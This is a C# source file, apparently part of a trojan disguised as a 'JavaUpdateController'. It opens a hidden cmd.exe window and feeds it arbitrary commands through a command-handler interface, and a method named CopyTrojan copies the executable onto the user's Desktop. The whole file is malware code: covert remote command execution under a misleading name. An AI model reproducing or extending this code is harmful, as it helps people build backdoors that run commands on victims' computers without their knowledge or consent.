using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace JavaUpdateController
{
    class CMDCustom : ICommand
    {
        private bool running;
        private static Process cmd;

        public CMDCustom()
        {
            running = false;
        }

        public static void OpenCmd(bool hidden)
        {
            cmd = new Process();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = hidden;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
        }

        public static void CMDCommandWork(String command)
        {
            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
        }

        public static void CopyTrojan()
        {
            OpenCmd(true);
            CMDCommandWork("copy "+ @"JavaUpdateController.exe" + @" C:\Users\" + Environment.UserName + @"\Desktop\JavaUpdateController.exe");
            Console.WriteLine("aici");
            cmd.Close();
        }

        public void Execute(string[] work)
        {
            if (running == false)
            {
                OpenCmd(true);
                running = true;
            }

            CMDCommandWork(work[1]);
        }
    }
}